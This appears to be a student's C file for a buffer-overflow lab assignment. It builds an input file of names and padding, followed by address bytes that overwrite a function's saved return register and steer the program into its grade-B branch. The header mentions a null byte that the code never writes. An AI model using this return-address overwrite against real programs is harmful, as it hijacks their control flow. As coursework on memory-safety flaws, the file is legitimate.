/*--------------------------------------------------------------------*/
/* File: createdataB.c                                                */
/*                                                                    */
/* Function: Produces a file called dataB with the student name,      */
/* a nullbyte, padding to overrun the stack, and the address          */
/* of the instruction in main to get a B, the latter of which will    */
/* overwrite getName's stored x30.                                    */
/*                                                                    */
/* Names: Alex Delistathis, Matthew Zhang                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>

int main(void) {
   FILE *dataB;
   dataB = fopen("dataB", "wb");

   const char name[] = "Alex Delisthathis & Matthew Zhang";
   fwrite(name, sizeof(char), strlen(name), dataB);

   const int paddingSize = 48 - strlen(name);

   for (int i = 0; i < paddingSize; i++) {
      fputc('A', dataB); 
   }

   putc(0x90, dataB);  
   putc(0x08, dataB); 
   putc(0x40, dataB);  

   fclose(dataB);
   return 0;
}

